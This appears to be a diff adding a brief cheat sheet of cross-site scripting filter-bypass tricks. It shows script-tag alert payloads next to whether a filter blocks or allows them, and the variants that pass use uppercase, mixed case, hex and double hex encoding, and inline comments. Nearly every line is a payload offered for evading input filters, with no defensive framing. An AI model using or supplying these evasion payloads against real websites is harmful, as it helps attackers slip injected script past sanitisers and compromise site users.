@@ -1,0 +1,26 @@
+tip 1 uppercase:
+<script>alert(4)</script> :block
+<SCRIPT>alert(4)</SCRIPT> :allow
+
+tip 2 mix uppercase with lowercase:
+<script>alert(4)</script> :block
+<SCRIPT>alert(4)</SCRIPT> :block
+<ScRiPT>alert(4)</scRIPt> :allow
+
+tip 3 encode hex:
+<script>alert(4)</script> :block
+<SCRIPT>alert(4)</SCRIPT> :block
+<ScRiPT>alert(4)</scRIPt> :block
+<s%63r%69pt>alert(4)</s%63r%69pt> :allow
+
+tip 4 double encode hex:
+<script>alert(4)</script> :block
+<ScRiPT>alert(4)</scRIPt> :block
+<s%63r%69pt>alert(4)</s%63r%69pt> :block
+<s%2563r%2569pt>alert(4)</s%2563r%2569pt> :allow
+*you can add more%25
+
+tip 5 add comment:
+Bypass tags add comment.
+<script>alert(4)</script> :block
+<script/**/>alert('b4walid')</script/**/>
